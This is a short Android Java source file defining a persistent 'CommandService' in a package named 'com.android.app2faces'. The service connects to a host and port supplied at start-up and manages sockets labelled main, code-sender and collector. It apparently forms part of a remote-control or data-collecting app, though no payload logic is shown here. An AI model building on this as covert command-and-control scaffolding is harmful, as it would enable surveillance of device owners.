package com.android.app2faces;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;


public class CommandService extends Service {
    private CommunicationTask communicationTask;

    public CommandService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String socketMainHostname = intent.getExtras().getString("hostname");
        int socketMainPort = intent.getExtras().getInt("port");

        this.communicationTask = new CommunicationTask(getApplicationContext(), socketMainHostname, socketMainPort);
        this.communicationTask.execute();

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        this.communicationTask.closeSocketMain();
        this.communicationTask.closeSocketCodeSender();
        this.communicationTask.closeSocketCollector();

        super.onDestroy();
    }
}
